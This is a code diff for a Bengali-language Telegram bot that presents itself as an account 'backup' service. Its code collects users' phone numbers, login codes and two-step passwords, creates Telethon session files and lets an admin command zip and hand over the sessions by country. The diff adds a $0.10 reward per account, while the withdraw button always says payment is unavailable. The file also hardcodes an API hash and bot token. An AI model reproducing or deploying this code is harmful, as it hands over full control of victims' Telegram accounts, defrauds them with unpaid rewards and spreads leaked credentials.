@@ -1,6 +1,7 @@
 import os
 import asyncio
 import zipfile
+import json
 from threading import Thread
 from flask import Flask
 import telebot
@@ -13,16 +14,62 @@ API_ID = 36547444
 API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
 BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
 ADMIN_ID = 8095751648
+
+# প্রতি সফল ব্যাকআপের জন্য ইউজার কত ডলার পাবে (যেমন: ০.১০ ডলার)
+REWARD_PER_BACKUP = 0.10
+
+# দেশ ভিত্তিক ফাইল জমার সর্বোচ্চ ক্যাপাসিটি (এডমিন এখান থেকে পরিবর্তন করতে পারবেন)
+COUNTRY_CAPACITY = {
+    "880": 10,   # বাংলাদেশ (সর্বোচ্চ ১০টি)
+    "91": 100,   # ইন্ডিয়া (সর্বোচ্চ ১০০টি)
+    "57": 100,   # কলম্বিয়া (সর্বোচ্চ ১০০টি)
+    "default": 50 # তালিকায় না থাকা অন্যান্য দেশের জন্য ডিফল্ট ক্যাপাসিটি
+}
 # ===================================================
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
 app = Flask(__name__)
 
 BASE_STORAGE_DIR = "user_backups"
+DB_FILE = "user_database.json"
+
 if not os.path.exists(BASE_STORAGE_DIR):
     os.makedirs(BASE_STORAGE_DIR)
 
 user_data = {}
+
+# ইউজার ডাটাবেস (ব্যালেন্স সেভ রাখার জন্য) লোড ও সেভ করার ফাংশন
+def load_db():
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, "r") as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def save_db(db):
+    with open(DB_FILE, "w") as f:
+        json.dump(db, f, indent=4)
+
+def get_user_balance(user_id):
+    db = load_db()
+    return db.get(str(user_id), {}).get("balance", 0.0)
+
+def add_user_balance(user_id, amount):
+    db = load_db()
+    uid_str = str(user_id)
+    if uid_str not in db:
+        db[uid_str] = {"balance": 0.0}
+    db[uid_str]["balance"] = round(db[uid_str]["balance"] + amount, 2)
+    save_db(db)
+
+# দেশের ফোল্ডারে বর্তমানে কয়টি ফাইল আছে গণনার ফাংশন
+def get_current_file_count(country_code):
+    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
+    if not os.path.exists(target_dir):
+        return 0
+    return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
 
 @app.route('/')
 def home():
@@ -39,15 +86,15 @@ Thread(target=run_web, daemon=True).start()
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
-# কান্ট্রি কোড এক্সট্রাক্ট করার ফাংশন (যেমন: +88017 -> 880)
+# কান্ট্রি কোড এক্সট্রাক্ট করার ফাংশন
 def get_country_code(phone_number):
     clean = phone_number.replace("+", "").replace(" ", "")
-    if clean.startswith("880"): return "880" # বাংলাদেশ
-    if clean.startswith("91"): return "91"   # ইন্ডিয়া
-    if clean.startswith("57"): return "57"   # কলম্বিয়া
-    if clean.startswith("1"): return "1"     # ইউএসএ/কানাডা
-    if clean.startswith("44"): return "44"   # ইউকে
-    if clean.startswith("7"): return "7"     # রাশিয়া
+    if clean.startswith("880"): return "880"
+    if clean.startswith("91"): return "91"
+    if clean.startswith("57"): return "57"
+    if clean.startswith("1"): return "1"
+    if clean.startswith("44"): return "44"
+    if clean.startswith("7"): return "7"
     return clean[:3]
 
 # ইউজারদের জন্য মেইন কীবোর্ড বাটন
@@ -76,21 +123,27 @@ def start_command(message):
             message.chat.id,
             "👋 *স্বাগতম!*\n\n"
             "আপনার টেলিগ্রাম আইডির একটি জিপ ফাইল ব্যাকআপ তৈরি করতে "
-            "আপনার ফোন নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: `+88017XXXXXXXX`) অথবা নিচের বোতামগুলো ব্যবহার করুন।",
+            "আপনার ফোন নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: `+88017XXXXXXXX`) অথবা নিচের বোবামগুলো ব্যবহার করুন।",
             reply_markup=get_user_keyboard()
         )
 
 # ওটিপি পাঠানোর অ্যাসিনক্রোনাস টাস্ক
 async def send_otp_task(phone_number, user_id, message):
-    clean_phone = phone_number.replace("+", "").replace(" ", "")
     country_code = get_country_code(phone_number)
     
-    # কান্ট্রি কোড অনুযায়ী আলাদা ফোল্ডার পাথ তৈরি
+    # ক্যাপাসিটি চেক লজিক (এডমিন কন্ট্রোল)
+    max_capacity = COUNTRY_CAPACITY.get(country_code, COUNTRY_CAPACITY["default"])
+    current_count = get_current_file_count(country_code)
+    
+    if current_count >= max_capacity:
+        bot.reply_to(message, f"❌ **Capacity Over!**\n\nদুঃখিত, এই মুহূর্তে দেশ কোড `+{country_code}` এর জন্য আমাদের সার্ভার স্টোরেজ সম্পূর্ণ ফুল। অনুগ্রহ করে পরে চেষ্টা করুন।")
+        return
+
+    clean_phone = phone_number.replace("+", "").replace(" ", "")
     country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
     if not os.path.exists(country_dir):
         os.makedirs(country_dir)
         
-    # ডেমো ফাইলের মতো হুবহু প্লাস চিহ্নসহ .session ফাইল তৈরি হবে
     final_session_path = os.path.join(country_dir, f"+{clean_phone}")
     
     user_client = TelegramClient(final_session_path, API_ID, API_HASH)
@@ -120,7 +173,11 @@ async def verify_otp_task(text, user_id, message):
             await user_client.sign_in(password=text)
             await user_client.disconnect()
             
-            bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!", reply_markup=get_user_keyboard())
+            # সফল ব্যাকআপের জন্য ব্যালেন্স যোগ করা
+            add_user_balance(user_id, REWARD_PER_BACKUP)
+            current_bal = get_user_balance(user_id)
+            
+            bot.reply_to(message, f"✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!\n💰 আপনার অ্যাকাউন্টে **${REWARD_PER_BACKUP}** যোগ করা হয়েছে। বর্তমান ব্যালেন্স: **${current_bal}**", reply_markup=get_user_keyboard())
             bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 ডেমো ফরম্যাটে স্টোরেজে সেশন ফাইলটি সংরক্ষণ করা হয়েছে।")
             del user_data[user_id]
         except Exception as e:
@@ -131,7 +188,11 @@ async def verify_otp_task(text, user_id, message):
             await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
             await user_client.disconnect()
             
-            bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!", reply_markup=get_user_keyboard())
+            # সফল ব্যাকআপের জন্য ব্যালেন্স যোগ করা
+            add_user_balance(user_id, REWARD_PER_BACKUP)
+            current_bal = get_user_balance(user_id)
+            
+            bot.reply_to(message, f"✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!\n💰 আপনার অ্যাকাউন্টে **${REWARD_PER_BACKUP}** যোগ করা হয়েছে। বর্তমান ব্যালেন্স: **${current_bal}**", reply_markup=get_user_keyboard())
             bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 ডেমো ফরম্যাটে স্টোরেজে সেশন ফাইলটি সংরক্ষণ করা হয়েছে।")
             del user_data[user_id]
         except SessionPasswordNeededError:
@@ -144,7 +205,7 @@ async def verify_otp_task(text, user_id, message):
                 os.remove(f"{data['session_path']}.session")
             del user_data[user_id]
 
-# এডমিন কম্যান্ড হ্যান্ডলার (স্ট্যাটাস চেক দেশ ভিত্তিক)
+# এডমিন কম্যান্ড হ্যান্ডলার (স্ট্যাটাস চেক)
 @bot.message_handler(commands=['status'])
 def status_command(message):
     if message.from_user.id != ADMIN_ID: return
@@ -156,21 +217,19 @@ def status_command(message):
     country_code = args[1].replace("+", "").strip()
     target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
     
-    if not os.path.exists(target_dir):
-        bot.reply_to(message, f"📊 দেশ কোড `{country_code}`-এর কোনো ব্যাকআপ ফাইল এখনো জমা হয়নি।")
-        return
+    max_cap = COUNTRY_CAPACITY.get(country_code, COUNTRY_CAPACITY["default"])
+    current_count = get_current_file_count(country_code)
         
-    files = [f for f in os.listdir(target_dir) if f.endswith(".session")]
-    bot.reply_to(message, f"📊 দেশ কোড `{country_code}`-এর ফোল্ডারে মোট **{len(files)}টি** সেশন ফাইল জমা আছে।")
+    bot.reply_to(message, f"📊 **দেশ কোড `+{country_code}` স্ট্যাটাস:**\n\n📁 মোট সেশন জমা: **{current_count}টি**\n⚙️ সর্বোচ্চ ক্যাপাসিটি লিমিট: **{max_cap}টি**")
 
-# এডমিন কম্যান্ড (আপনার কাঙ্ক্ষিত কান্ট্রি কোড ও ফাইলের সংখ্যা অনুযায়ী ডেমো জিপ ডেলিভারি)
+# এডমিন কম্যান্ড (গেট ফাইল)
 @bot.message_handler(commands=['get'])
 def get_files(message):
     if message.from_user.id != ADMIN_ID: return
     args = message.text.split()
     
     if len(args) < 3:
-        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`\n\n📌 উদাহরণ: `/get 880 5`")
+        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`")
         return
         
     country_code = args[1].replace("+", "").strip()
@@ -196,12 +255,11 @@ def get_files(message):
     
     master_zip_name = f"Country_{country_code}_Fetch_{actual_count}_files.zip"
     try:
-        # এখানে এডমিনকে পাঠানোর জন্য ফাইলগুলো জিপ করা হচ্ছে
         with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
             for file_name in files_to_take:
                 file_path = os.path.join(target_dir, file_name)
                 master_zip.write(file_path, arcname=file_name)
-                os.remove(file_path) # এক্সট্রাক্ট করার পর মেইন স্টোরেজ খালি করার জন্য
+                os.remove(file_path)
         with open(master_zip_name, 'rb') as doc:
             bot.send_document(message.chat.id, doc, caption=f"✅ দেশ কোড `+{country_code}`-এর সফলভাবে {actual_count}টি ফাইল পাঠানো হলো।")
     except Exception as e:
@@ -215,16 +273,40 @@ def get_files(message):
 def handle_text(message):
     user_id = message.from_user.id
     text = message.text.strip()
+    username = message.from_user.username if message.from_user.username else "নেই"
 
     if text == "👤 My Profile":
-        bot.reply_to(message, f"👤 *আপনার প্রোফাইল*\n\n🆔 ইউজার আইডি: `{user_id}`\n🌐 স্টেটাস: একটিভ অ্যাকাউন্ট।")
+        balance = get_user_balance(user_id)
+        profile_text = (
+            f"👤 **আপনার প্রোফাইল**\n\n"
+            f"🆔 ইউজার আইডি: `{user_id}`\n"
+            f"🌐 টেলিগ্রাম আইডি (Username): @{username}\n"
+            f"💰 মোট ব্যালেন্স: **${balance}**\n\n"
+            f"📌 প্রতি সফল ব্যাকআপে আপনি পাবেন **${REWARD_PER_BACKUP}**!"
+        )
+        bot.reply_to(message, profile_text)
         return
+        
     elif text == "💳 Withdraw":
         bot.reply_to(message, "💳 *উইথড্র রিকোয়েস্ট*\n\n❌ দুঃখিত, বর্তমানে আপনার ব্যালেন্স পর্যাপ্ত নয় অথবা উইথড্র সিস্টেমটি বন্ধ আছে।")
         return
+        
     elif text == "📊 Capacity":
-        bot.reply_to(message, "📊 *সার্ভার ক্যাপাসিটি*\n\n🟢 আমাদের ক্লাউড সার্ভার ১০০% ফাস্ট ও নিরাপদ মোডে সচল রয়েছে।")
+        # প্রধান তিনটি দেশের বর্তমান স্ট্যাটাস ও ক্যাপাসিটি দেখানো
+        bd_count = get_current_file_count("880")
+        in_count = get_current_file_count("91")
+        co_count = get_current_file_count("57")
+        
+        capacity_text = (
+            f"📊 **সার্ভার ক্যাপাসিটি স্ট্যাটাস**\n\n"
+            f"🇧🇩 বাংলাদেশ: `{bd_count}/{COUNTRY_CAPACITY['880']}`টি স্টোর করা যাবে।\n"
+            f"🇮🇳 ইন্ডিয়া: `{in_count}/{COUNTRY_CAPACITY['91']}`টি স্টোর করা যাবে।\n"
+            f"🇨🇴 কলম্বিয়া: `{co_count}/{COUNTRY_CAPACITY['57']}`টি স্টোর করা যাবে।\n\n"
+            f"⚠️ কোনো দেশের ফাইল ফুল হয়ে গেলে সেখানে সাময়িকভাবে ব্যাকআপ বন্ধ দেখাবে।"
+        )
+        bot.reply_to(message, capacity_text)
         return
+        
     elif text == "❌ Cancel":
         if user_id in user_data:
             del user_data[user_id]
@@ -244,5 +326,5 @@ def handle_text(message):
         loop.run_until_complete(verify_otp_task(text, user_id, message))
 
 if __name__ == "__main__":
-    print("--- Exact Demo Match Multi-Country Bot Active ---")
+    print("--- Pro-Level Custom Architecture Active ---")
     bot.infinity_polling()
